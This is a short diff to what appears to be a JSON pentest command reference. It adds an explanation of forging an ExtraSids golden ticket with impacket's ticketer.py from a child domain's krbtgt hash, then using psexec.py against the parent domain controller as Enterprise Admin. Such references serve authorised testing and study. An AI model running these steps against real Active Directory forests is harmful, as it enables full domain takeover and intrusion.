@@ -107,5 +107,6 @@
       "label": "Access the parent DC",
       "command": "psexec.py -k -no-pass <child_domain>/Administrator@<parent_dc_fqdn>"
     }
-  ]
+  ],
+  "explain": "Forges an ExtraSids golden ticket from Linux with impacket:\n  ticketer.py              build a golden ticket offline\n  -nthash <child_krbtgt_hash>   the child krbtgt NT hash that signs it (use -aesKey for AES)\n  -domain <child_domain> -domain-sid <child_sid>   the child domain and SID\n  -extra-sid <parent_EA_sid>   the parent Enterprise Admins SID added to SID History\n  Administrator            the username baked into the ticket\nExport KRB5CCNAME to the resulting .ccache and psexec the parent DC as EA."
 }
